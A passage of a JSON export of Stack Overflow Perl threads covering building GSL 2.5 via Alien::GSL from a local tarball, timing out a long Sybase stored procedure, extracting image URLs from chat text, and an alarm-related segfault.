58155291, "comment_id": 102693927, "body": "If you already have <code>libgsl</code> version 2.6 on you system, you might also have the command <code>gsl-config</code>. What is the output of running <code>gsl-config --version</code>? From <a href=\"https://metacpan.org/source/LETO/Math-GSL-0.40/Build.PL#L296\" rel=\"nofollow noreferrer\">the source</a> it seems it will try <code>gsl-config</code> first."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1569763166, "post_id": 58155291, "comment_id": 102693930, "body": "When you run <code>pkg-config --modversion gsl</code>, it says <code>Package gsl was not found in the pkg-config search path. Perhaps you should add the directory containing &#39;gsl.pc&#39; to the PKG_CONFIG_PATH environment variable No package &#39;gsl&#39; found</code> I think that <code>gsl.pc</code> is created when you build <code>gsl</code>. Try building 2.5, and check if it creates a <code>gsl.pc</code>. If so, follow the above instructions, and you should be ok"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1569763485, "post_id": 58155291, "comment_id": 102694000, "body": "Did you try just changing <code>my $ver2func = Ver2Func-&gt;new( $gsl_conf-&gt;{gsl_version} );</code> to <code>my $ver2func = Ver2Func-&gt;new( &#39;2.5&#39; );</code> in Math::GSL&#39;s <code>Build.PL</code>? Hopefully, 2.6 is backwards compatible with 2.5"}, {"owner": {"reputation": 38072, "user_id": 46395, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/5ce828f20abb195ef5d971205ee36c27?s=128&d=identicon&r=PG", "display_name": "daxim", "link": "https://stackoverflow.com/users/46395/daxim"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1569764597, "post_id": 58155291, "comment_id": 102694278, "body": "I had deinstalled on purpose gsl-devel-2.6, wich includes pkgconfig files and gsl-config, so it does not interfere. I want to build gsl-2.5 <b>through Alien::GSL</b> from a local tarball. /// @ikegami, forcing the version that way eventually errors out in <code>xs&#47;SparseMatrix_wrap.2.5.c</code>; not compatible."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1569765726, "post_id": 58155291, "comment_id": 102694572, "body": "The whole point of Alien::* is to install <i>if not already installed</i>, which goes back to my first two comments."}, {"owner": {"reputation": 32176, "user_id": 2173773, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/M8yh6.jpg?s=128&g=1", "display_name": "H&#229;kon H&#230;gland", "link": "https://stackoverflow.com/users/2173773/h%c3%a5kon-h%c3%a6gland"}, "edited": false, "score": 0, "creation_date": 1569766045, "post_id": 58155291, "comment_id": 102694664, "body": "Why not install from source: <code>tar zxvf &#47;tmp&#47;gsl-2.5.tar.gz &amp;&amp; cd gsl-2.5 &amp;&amp; .&#47;configure --prefix=&#47;opt&#47;gsl&#47;gsl-2.5 &amp;&amp; make &amp;&amp; sudo make install</code>. Then make  <code>&#47;opt&#47;gsl&#47;gsl-2.5&#47;bin</code> available in <code>$PATH</code> such that it finds <code>&#47;opt&#47;gsl&#47;gsl-2.5&#47;bin&#47;gsl-config</code> ?"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1569766490, "post_id": 58155291, "comment_id": 102694786, "body": "Looks like it unconditionally takes the newest version <code>$cabinet-&gt;sort_files;     {     local $CWD = $self-&gt;alien_temp_dir;       my $file = $cabinet-&gt;files-&gt;[0]; </code>. I didn&#39;t see anyway (e.g. using env vars) of overriding the repo specified in Alien::GSL&#39;s <code>Build.PL</code>, so the only way to get Alien::GSL to build 2.5 would be to edit its <code>Build.PL</code>. It looks like you can set <code>protocol</code> of <code>local</code> to use a local file"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1569766665, "post_id": 58155291, "comment_id": 102694819, "body": "But of course, the whole point of Alien::* is to install a module <i>if it&#39;s not already installed</i>, so makes more sense to just install 2.5 rather than mucking with <code>Build.PL</code>."}, {"owner": {"reputation": 8718, "user_id": 5848200, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8072aaf76dcb4fe5027964252f16382?s=128&d=identicon&r=PG", "display_name": "Grinnz", "link": "https://stackoverflow.com/users/5848200/grinnz"}, "edited": false, "score": 0, "creation_date": 1569767402, "post_id": 58155291, "comment_id": 102695006, "body": "Since Alien::GSL uses Alien::Base::ModuleBuild, <a href=\"https://metacpan.org/pod/Alien::Base::ModuleBuild#ENVIRONMENT\" rel=\"nofollow noreferrer\">metacpan.org/pod/Alien::Base::ModuleBuild#ENVIRONMENT</a> may be helpful."}], "answers": [{"tags": [], "owner": {"reputation": 38072, "user_id": 46395, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/5ce828f20abb195ef5d971205ee36c27?s=128&d=identicon&r=PG", "display_name": "daxim", "link": "https://stackoverflow.com/users/46395/daxim"}, "is_accepted": true, "score": 2, "last_activity_date": 1569774709, "creation_date": 1569774709, "answer_id": 58157145, "question_id": 58155291, "link": "https://stackoverflow.com/questions/58155291/how-do-i-make-alien-use-an-existing-tarball-instead-of-downloading/58157145#58157145", "title": "How do I make Alien use an existing tarball instead of downloading?", "body": "<p><a href=\"/u/589924\">ikegami</a> found the <a href=\"/q/58155291#comment102694786_58155291\">decisive hint</a>:</p>\n\n<blockquote>\n  <p>It looks like you can set protocol of local to use a local file </p>\n</blockquote>\n\n<hr>\n\n<p>Tested step-by-step instructions, plus some additional work-arounds; to me it looks like the build systems of the  two modules are buggy/insufficiently tested:</p>\n\n<pre><code>cpanm --look Alien::GSL\n</code></pre>\n\n<p>patch Build.PL</p>\n\n<pre><code>diff --git a/Build.PL b/Build.PL\nindex 32f3057..6537138 100644\n--- a/Build.PL\n+++ b/Build.PL\n@@ -20,10 +20,9 @@ my $builder = Alien::Base::ModuleBuild-&gt;new(\n   alien_name =&gt; 'gsl',\n   alien_repository =&gt; [\n     {\n-      protocol =&gt; 'ftp',\n-      host     =&gt; 'ftp.gnu.org',\n-      location =&gt; '/gnu/gsl',\n-      pattern  =&gt; qr/^gsl-([\\d\\.]+)\\.tar\\.gz$/,\n+      protocol =&gt; 'local',\n+      location =&gt; '/tmp',\n+      pattern  =&gt; 'gsl-2.5.tar.gz',\n     },\n   ],\n   meta_merge =&gt; {\n-- \n2.23.0\n</code></pre>\n\n<pre><code>perl Build.PL\n./Build\n</code></pre>\n\n<p>Pay attention to the generated <code>configure</code>/<code>libtool</code> commands here, they match the Perl configuration. A manual installation without those various options is not guaranteed to be compatible or usable. (This is not superstition: a similar problem historically shows up when installing mod_perl2 and libapreq2 from source on a system httpd; perl needs to be compiled first, then httpd to match, then the other packages, otherwise it won't work.) This shows the value of installing through Alien, since it delegates to M::B, the correct options will be figured out. It's above my level of knowledge to accurately create them from scratch.</p>\n\n<pre><code>./Build test\n</code></pre>\n\n<p><code>gsl-config</code> in blib now erroneously contains build paths, not install paths, fix:</p>\n\n<pre><code>perl -MConfig -i -lpe'\n    s|/.*(/auto/share/dist/Alien-GSL)|$Config{installsitelib}$1|\n' blib/lib/auto/share/dist/Alien-GSL/bin/gsl-config\n./Build install\nexit # cpanm\n\ncpanm --look Math::GSL\n# let it pick up gsl-config on PATH\nexport PATH=$PATH:$(perl -mAlien::GSL -e'print Alien::GSL-&gt;bin_dir')\nperl Build.PL\n./Build\nexport LD_LIBRARY_PATH=$LD_LIBRARY_PATH:$(gsl-config --libs | perl -lne'/-L(\\S+) / &amp;&amp; print $1')\n./Build test\n./Build install\nexit # cpanm\n</code></pre>\n\n<p>Finally r\u00ebexport the variables whenever you want to use Math::GSL.</p>\n"}], "owner": {"reputation": 38072, "user_id": 46395, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/5ce828f20abb195ef5d971205ee36c27?s=128&d=identicon&r=PG", "display_name": "daxim", "link": "https://stackoverflow.com/users/46395/daxim"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 53, "favorite_count": 0, "accepted_answer_id": 58157145, "answer_count": 1, "score": 1, "last_activity_date": 1569774709, "creation_date": 1569760835, "question_id": 58155291, "link": "https://stackoverflow.com/questions/58155291/how-do-i-make-alien-use-an-existing-tarball-instead-of-downloading", "title": "How do I make Alien use an existing tarball instead of downloading?", "body": "<p>My distro does not offer any gsl &lt;2.6 any more.</p>\n\n<p>Given:</p>\n\n<ul>\n<li>Alien::GSL 1.01</li>\n<li>/tmp/gsl-2.5.tar.gz</li>\n</ul>\n\n<p>How do I force it to compile that gsl instead of downloading from GNU FTP version 2.6, which I already have on the system anyway <a href=\"https://metacpan.org/source/LETO/Math-GSL-0.40/inc/Ver2Func.pm#L250\" rel=\"nofollow noreferrer\">but is not delectable to Math::GSL 0.40</a>?</p>\n\n<p>I unsuccessfully tried: </p>\n\n<ul>\n<li>copying the tarball into the unpacked Alien::GSL base directory</li>\n<li>messing with <a href=\"http://p3rl.org/Alien::Base::ModuleBuild\" rel=\"nofollow noreferrer\">alien_repository</a></li>\n</ul>\n\n<p>This is for a throw-away project. I'm okay with manual installation instructions and patching toolchain code.</p>\n"}, {"tags": ["perl", "timeout", "sybase"], "comments": [{"owner": {"reputation": 188041, "user_id": 10676716, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/arsQA.jpg?s=128&g=1", "display_name": "GMB", "link": "https://stackoverflow.com/users/10676716/gmb"}, "edited": false, "score": 0, "creation_date": 1569676666, "post_id": 58146492, "comment_id": 102677927, "body": "What is <code>Sybapi</code>? I cannot find it on CPAN. Are you actually using <code>DBD::Sybase</code> to connect the database?"}, {"owner": {"reputation": 13, "user_id": 12134085, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/58a60d185ae5238445c61ffb943d12f2?s=128&d=identicon&r=PG&f=1", "display_name": "sl266", "link": "https://stackoverflow.com/users/12134085/sl266"}, "reply_to_user": {"reputation": 188041, "user_id": 10676716, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/arsQA.jpg?s=128&g=1", "display_name": "GMB", "link": "https://stackoverflow.com/users/10676716/gmb"}, "edited": false, "score": 0, "creation_date": 1569689962, "post_id": 58146492, "comment_id": 102681128, "body": "It is something developed by our own. I haven&#39;t tried DBD::Sybase."}, {"owner": {"reputation": 27648, "user_id": 9952196, "user_type": "registered", "profile_image": "https://graph.facebook.com/10216835866235879/picture?type=large", "display_name": "Shawn", "link": "https://stackoverflow.com/users/9952196/shawn"}, "edited": false, "score": 1, "creation_date": 1569695339, "post_id": 58146492, "comment_id": 102682351, "body": "What are you learning from that says to call subroutines via a leading <code>&amp;</code>?"}, {"owner": {"reputation": 13399, "user_id": 716443, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8d13509991dbbd5467f01f55988ae4e?s=128&d=identicon&r=PG", "display_name": "DavidO", "link": "https://stackoverflow.com/users/716443/davido"}, "edited": false, "score": 1, "creation_date": 1569724205, "post_id": 58146492, "comment_id": 102687155, "body": "Perhaps a better approach would be to delete data from your Sybase database in much smaller chunks so that no query takes so long that you overshoot your time window. While you&#39;re at it, use DBD::Sybase from CPAN; it may not be better behaved, but it&#39;s probably better understood by the community than an in-house sybase driver."}, {"owner": {"reputation": 8716, "user_id": 7366100, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/426e64e0d4a4ee822821a63c62424ddb?s=128&d=identicon&r=PG&f=1", "display_name": "markp-fuso", "link": "https://stackoverflow.com/users/7366100/markp-fuso"}, "edited": false, "score": 0, "creation_date": 1569790819, "post_id": 58146492, "comment_id": 102700641, "body": "Is the stored proc running a single query for a lengthy period of time, or is it running some sort of cursor/looping process?  If the former, have you done any P&amp;T analysis to find out if &#39;long running&#39; is expected?  if the latter, consider passing the time to the stored proc, then on each pass through the cursor/loop test the difference between the &#39;start&#39; and &#39;current&#39; time to see if you&#39;ve hit your max (and if so then break out of the loop); granted, this won&#39;t help if you determine the run time <i>after</i> the proc has been called ..."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1569861095, "post_id": 58146492, "comment_id": 102724738, "body": "See <a href=\"http://stackoverflow.com/help/someone-answers\">What should I do when someone answers my question?</a>  And if there are still questions please speak up."}], "answers": [{"comments": [{"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1569861161, "post_id": 58147155, "comment_id": 102724771, "body": "Isn&#39;t this precisely their previous question (which you answered?), on how this doesn&#39;t work?"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1570014615, "post_id": 58147155, "comment_id": 102778485, "body": "sl266 has previously posted that this results in a segfault."}], "tags": [], "owner": {"reputation": 472, "user_id": 2001559, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/L1bvT.png?s=128&g=1", "display_name": "Maverick", "link": "https://stackoverflow.com/users/2001559/maverick"}, "is_accepted": false, "score": 0, "last_activity_date": 1569686376, "last_edit_date": 1569686376, "creation_date": 1569680003, "answer_id": 58147155, "question_id": 58146492, "link": "https://stackoverflow.com/questions/58146492/how-to-set-timeout-for-a-long-running-sybase-sp-in-perl/58147155#58147155", "title": "How to set timeout for a long running Sybase sp in Perl", "body": "<p>You can use 'alarm' for this <a href=\"https://perldoc.perl.org/functions/alarm.html\" rel=\"nofollow noreferrer\">https://perldoc.perl.org/functions/alarm.html</a></p>\n\n<pre><code>    my $timeout = 3600; # 1hr = 3600 sec\n    eval {\n        local $SIG{ALRM} = sub { die \"alarm\\n\" }; # NB: \\n required\n        alarm $timeout;\n        $db = new Sybapi($user, $password, $server, $margin_database); \n        $db-&gt;exec_sql(\"exec CPN_Margins..clean_up_refData_db '$XrefCode'\");\n        alarm 0;\n    };\n    if ($@) {\n        die unless $@ eq \"alarm\\n\";   # propagate unexpected errors\n        # timed out\n    }\n    else {\n        # didn't timed out\n    }\n</code></pre>\n\n<p>Also what is 'Sybapi'? In the past I have use 'DBD::Sybase' to connect to Sybase ASE(or 'sybperl' in old legacy code), and 'DBD::SQLAnywhere' to connect to <a href=\"http://infocenter.sybase.com/help/index.jsp?topic=/com.sybase.infocenter.dc01776.1601/doc/html/san1357754962101.html\" rel=\"nofollow noreferrer\">Sybase IQ</a>.</p>\n"}, {"comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1570014975, "post_id": 58148153, "comment_id": 102778645, "body": "Tip: You normally want to follow up a TERM signal with a KILL signal if the process is still running after it should have had long enough to exit. (But it&#39;s not necessary to demonstrate that here.)"}], "tags": [], "owner": {"reputation": 110113, "user_id": 168657, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/f14e7610fca39322ebbf23530def15f8?s=128&d=identicon&r=PG", "display_name": "mob", "link": "https://stackoverflow.com/users/168657/mob"}, "is_accepted": true, "score": 5, "last_activity_date": 1570014812, "last_edit_date": 1570014812, "creation_date": 1569687350, "answer_id": 58148153, "question_id": 58146492, "link": "https://stackoverflow.com/questions/58146492/how-to-set-timeout-for-a-long-running-sybase-sp-in-perl/58148153#58148153", "title": "How to set timeout for a long running Sybase sp in Perl", "body": "<p>I'm always wary of using <code>alarm</code> to interrupt a system call, as I find it hard to predict when the signal will be ignored <a href=\"https://stackoverflow.com/questions/58144739/perl-getting-segmentation-fault-while-timeout-using-alarm\">or worse</a>.</p>\n\n<p>An alternative is to run your long-running code in a background process, and monitor its progress in the main process.</p>\n\n<pre><code># DelRef() might take a while ...\nmy $start_time = time;\nmy $pid = fork();\nif ($pid == 0) {\n    # child process\n    DelRef();\n    exit 0;\n}\n# parent process\nwhile (1) {\n    use POSIX qw( WNOHANG );\n    my $waitpid = waitpid $pid, WNOHANG;\n    if ($pid == $waitpid) {\n        print STDERR \"DelRef() finished successfully\\n\";\n        last;\n    }\n    if (time - $start_time &gt; 3600) {\n        print STDERR \"DelRef() didn't finish in an hour\\n\";\n        kill 'TERM',$pid;    # optional\n        last;\n    }\n    print STDERR \"DelRef() is still running ...\\n\";\n    sleep 60;\n}\nprint STDERR \"... the rest of the script ...\\n\";\n</code></pre>\n"}], "owner": {"reputation": 13, "user_id": 12134085, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/58a60d185ae5238445c61ffb943d12f2?s=128&d=identicon&r=PG&f=1", "display_name": "sl266", "link": "https://stackoverflow.com/users/12134085/sl266"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 192, "favorite_count": 1, "accepted_answer_id": 58148153, "answer_count": 2, "score": 1, "last_activity_date": 1570014812, "creation_date": 1569675093, "question_id": 58146492, "link": "https://stackoverflow.com/questions/58146492/how-to-set-timeout-for-a-long-running-sybase-sp-in-perl", "title": "How to set timeout for a long running Sybase sp in Perl", "body": "<p>I'm calling a stored procedure which deletes data from Sybase DB in a Perl. But the sp takes hours to complete.\nI just want the sp to run for 1 hour, then no matter whether it completes or not I want the codes afterwards to be running. How can I implement this?</p>\n\n<pre><code>sub DelRef {\n    print \"starting defRefData\\n\";\n    $db = new Sybapi($user, $password, $server, $margin_database); \n    #the following sql will take hours\n    $db-&gt;exec_sql(\"exec CPN_Margins..clean_up_refData_db '$XrefCode'\");\n}\n\n&amp;DelRef();\nprint \"process is done\\n\";\n$db-&gt;close();\n</code></pre>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 4524, "user_id": 8893864, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-mfBb3bzlcfw/AAAAAAAAAAI/AAAAAAAAADM/vILdjUEHHM8/photo.jpg?sz=128", "display_name": "Holli", "link": "https://stackoverflow.com/users/8893864/holli"}, "edited": false, "score": 0, "creation_date": 1569678808, "post_id": 58145153, "comment_id": 102678437, "body": "This code is an unsalvagable mess. What is your intention? Do you just need something that works? Or do you want to learn how to code that yourself?"}, {"owner": {"user_type": "does_not_exist", "display_name": "user11656759"}, "edited": false, "score": 0, "creation_date": 1569703207, "post_id": 58145153, "comment_id": 102684250, "body": "Surely I need something that works, and I have done this in the past about 15 years ago,  I just can not remember how I did this the last time.   I need to break up that string, and place only the image URL into the s/$image/&lt;img src=$image&gt;/ That is the closes I could get now."}], "answers": [{"comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user11656759"}, "edited": false, "score": 0, "creation_date": 1569798002, "post_id": 58150414, "comment_id": 102701935, "body": "That code does nothing on this program. I know there is a way and I am on the right track. I at least get the picture from the code, it only messes up if I type in front of it.  The message is seen through a filter,  The img src is not printed, it is created on the fly through the filter.  The only thing that is printed is the text, and the URL.  I did this back in the late 90s and early 2000s, and I did not use any module. I just forgot how I did it for reasons beyond my control.   I am rewriting a program, I lost long ago when we did hard coding!  Thank you for your input!"}], "tags": [], "owner": {"reputation": 4524, "user_id": 8893864, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-mfBb3bzlcfw/AAAAAAAAAAI/AAAAAAAAADM/vILdjUEHHM8/photo.jpg?sz=128", "display_name": "Holli", "link": "https://stackoverflow.com/users/8893864/holli"}, "is_accepted": false, "score": 2, "last_activity_date": 1569705840, "creation_date": 1569705840, "answer_id": 58150414, "question_id": 58145153, "link": "https://stackoverflow.com/questions/58145153/how-can-i-separate-a-image-http-url-and-email-from-a-perl-string-of-code/58150414#58150414", "title": "How can I separate a image, HTTP URL and email from a Perl string of code", "body": "<p>URL parsing and handling is not trivial. It's very easy to get it wrong, thus it should be left to a battle tested module if possible. Consider this code.</p>\n\n<pre><code>use URI;\nuse URL::Search qw(extract_urls);\n\nmy $webpage = join \"\", &lt;DATA&gt;; # wherever your data comes from\n\nfor my $url (extract_urls $webpage) \n{\n    my $url_object    = URI-&gt;new( $url );\n    my $host_ok       = $url_object-&gt;host =~ /\\.(com|net|jp|org|uk)$/i;\n    my $is_image      = $url_object-&gt;path =~ /\\.(jpg|jpeg|gif|png)$/i;\n    my $save_url      = $url_object-&gt;canonical;\n    my $regex_for_url = quotemeta( $url );\n\n    $webpage =~ s/$regex_for_url/&lt;img src=\"$save_url\"&gt;/g\n      if $host_ok &amp;&amp; $is_image;\n}\n\nprint $webpage;\n__DATA__\nhttps://docs.perl6.org\nhttps://github.xxx/foo.gif\nhttps://docs.perl6.org/camelia.png\nhttps://docs.perl6.org/camelia.gif\n</code></pre>\n\n<p>Output</p>\n\n<pre><code>https://docs.perl6.org\nhttps://github.xxx/foo.gif\n&lt;img src=\"https://docs.perl6.org/camelia.png\"&gt;\n&lt;img src=\"https://docs.perl6.org/camelia.gif\"&gt;\n</code></pre>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user11656759"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 78, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1569832599, "creation_date": 1569664257, "last_edit_date": 1569832599, "question_id": 58145153, "link": "https://stackoverflow.com/questions/58145153/how-can-i-separate-a-image-http-url-and-email-from-a-perl-string-of-code", "title": "How can I separate a image, HTTP URL and email from a Perl string of code", "body": "<p>This is a chat program. I managed to separate the Images from most of the text, but it leaves it embedded in a string. There is no telling where the URL will be located in the string, and if typing is before it or after it, it appears in the string!  I need it to separate and place only the image       regex URL  into the s/$image//.</p>\n\n<p>I have tried while loops, foreach loops and crashed the whole system with a for loop!   I do get the image in place but only if I leave a whole blank line for it. Same thing with the webpage.... </p>\n\n<pre><code>      if (($searchhttp = m/^http/sig) \n      &amp;&amp; ($search_image = m/(.jpg|.jpeg|.gif|.png)/ig)) {\n    @jpgimage = @_;\n    $jpgimage = $jpgimage[0];\n\n   $jpgimage =~ grep(/(^https?:\\/\\/)?([\\da-z\\.-]+)\\.([a-z\\.]{2,6}) ([\\/\\w \\.-]*)*\\/?(?:.jpg|.jpeg|.gif|png)$/sig);\n\n           $image = substr($jpgimage, 0);\n           ($image) = split(/\\s+/, $jpgimage);\n                    chomp($image);\n\n   $filter =~ s/$image/&lt;img src ='$image' align ='left'&gt;/; \n\n    print $image.'&lt;BR&gt;';\n   #print $jpgimage.'&lt;BR&gt;';\n  }\n</code></pre>\n\n<p>If I leave it on just one line, it works... If I type before it or after it it does not. it includes the whole string in the a href, or the img src.</p>\n\n<p>I need to find a way to take it out of the string</p>\n\n<p>Example...</p>\n\n<p>It takes the whole text from that line and places it in the right brackets, just one long string...\n\"testing if this works <a href=\"http://172.31.4.253/images/joe.jpg\" rel=\"nofollow noreferrer\">http://172.31.4.253/images/joe.jpg</a>\"\n\"<a href=\"https://www.perltutorial.org\" rel=\"nofollow noreferrer\">https://www.perltutorial.org</a> lets try this\"</p>\n\n<p>I have spent a month on this... and the out come with this code is the best I've gotten!</p>\n\n<p>There could be and most likely be more then one image.</p>\n\n<p>This is the out comes after I paste 5 pictures, one with the word Test in front, and these 4 are placed in the img src...</p>\n\n<pre><code>http://172.31.4.253/images/joe.jpg\nhttps://www.perltutorial.org/wp-content/uploads/2012/11/Perl-Tutorial.jpg\nhttp://172.31.4.253/images/joe.jpg\nhttps://www.perltutorial.org/wp-content/uploads/2012/11/Perl-Tutorial.jpg\n</code></pre>\n"}, {"tags": ["perl", "segmentation-fault", "timeout", "alarm"], "comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1569664815, "post_id": 58144739, "comment_id": 102675462, "body": "Presumably, the C code in Sybapi mishandles the error that occurs when a signal happens during some system calls. (Signals cause blocking system calls to return with <code>EINTR</code> to give signal handlers a chance to run.)"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1569664837, "post_id": 58144739, "comment_id": 102675468, "body": "I&#39;m not sure what you&#39;re trying to get out of this. You didn&#39;t even a question, for starters."}, {"owner": {"reputation": 13, "user_id": 12134085, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/58a60d185ae5238445c61ffb943d12f2?s=128&d=identicon&r=PG&f=1", "display_name": "sl266", "link": "https://stackoverflow.com/users/12134085/sl266"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1569667525, "post_id": 58144739, "comment_id": 102675976, "body": "So i shouldn&#39;t be using Sybapi? I want to how i can fix this segmentation fault."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1569669372, "post_id": 58144739, "comment_id": 102676353, "body": "If you want more than  &quot;don&#39;t use <code>alarm</code> and Sybapi together&quot;, you&#39;re asking how to debug C code. That&#39;s rather far beyond the scope of this site."}], "answers": [{"comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 1, "creation_date": 1569733708, "post_id": 58147236, "comment_id": 102688202, "body": "That has nothing to do with the question. The OP&#39;s <code>sleep</code> clearly doesn&#39;t rely on <code>alarm</code>, and the OP is specifically not having the problem he&#39;s asking about when using <code>sleep</code> instead of the slow DB call."}], "tags": [], "owner": {"reputation": 472, "user_id": 2001559, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/L1bvT.png?s=128&g=1", "display_name": "Maverick", "link": "https://stackoverflow.com/users/2001559/maverick"}, "is_accepted": false, "score": 0, "last_activity_date": 1569680554, "creation_date": 1569680554, "answer_id": 58147236, "question_id": 58144739, "link": "https://stackoverflow.com/questions/58144739/perl-getting-segmentation-fault-while-timeout-using-alarm/58147236#58147236", "title": "Perl getting segmentation fault while timeout using alarm", "body": "<p>From perldoc (<a href=\"https://perldoc.perl.org/functions/alarm.html)-\" rel=\"nofollow noreferrer\">https://perldoc.perl.org/functions/alarm.html)-</a></p>\n\n<blockquote>\n  <p>It is usually a mistake to intermix alarm and sleep calls, because\n  sleep may be internally implemented on your system with alarm.</p>\n</blockquote>\n\n<p>If you want to implement timeout, it can be achieved without sleep. Just follow the example mentioned in the link.</p>\n\n<p>EDIT:\nI have added it here -<a href=\"https://stackoverflow.com/questions/58146492/how-to-set-timeout-for-a-long-running-sybase-sp-in-perl/58147155#58147155\">How to set timeout for a long running Sybase sp in Perl</a></p>\n"}], "owner": {"reputation": 13, "user_id": 12134085, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/58a60d185ae5238445c61ffb943d12f2?s=128&d=identicon&r=PG&f=1", "display_name": "sl266", "link": "https://stackoverflow.com/users/12134085/sl266"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 72, "favorite_count": 0, "answer_count": 1, "score": 0, 